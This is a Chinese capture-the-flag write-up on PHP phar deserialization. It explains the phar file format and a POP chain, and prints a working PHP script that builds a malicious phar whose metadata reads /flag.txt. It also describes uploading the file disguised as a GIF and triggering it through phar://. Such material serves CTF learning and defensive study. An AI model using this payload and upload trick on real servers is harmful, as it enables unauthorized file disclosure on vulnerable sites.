phar(“Php Archive”)是PHP里的一种打包文件；其中的数据以序列化的形式保存。
phar文件结构：

  1. stub

    供phar扩展用于识别的标志，格式：xxx<?php xxx; __HALT_COMPILER();?>xxx随意，可以在前面使用文件头伪造图片等GIF98a

  2. manifest

    phar本质是一种压缩文件，每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这就是触发反序列化的点，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化。

  3. contents

    内容

  4. signature

    签名，放在文件末尾

所以可以将我们构造反序化脚本放入phar，生成phar文件，再用phar://反序列化

pop链：User->$db->FileList->$files->File

大佬的脚本： 

```php
<?php
class User {
    public $db;
}
class File {
    public $filename;
}
class FileList {
    private $files;
    public function __construct() {
        $file = new File();
        $file->filename = "/flag.txt";
        $this->files = array($file);
    }
}

$a = new User();
$a->db = new FileList();

$phar = new Phar("phar.phar"); //后缀名必须为phar

$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$o = new User();
$o->db = new FileList();

$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

运行后会生成个phar.phar文件
运行报错的话，要改一下php.ini

phar.readonly默认是开启的
将文件上传，改Content-Type: image/gif
上传后删除此文件，抓包

知识点

phar

  • 利用条件：
  • phar文件要能够上传到服务器端，file_exists()、fopen()、file_get_contents()、file()等文件操作的函数
  • 有可用的魔法函数作为“跳板”
  • 关键字符未被过滤:、/、phar
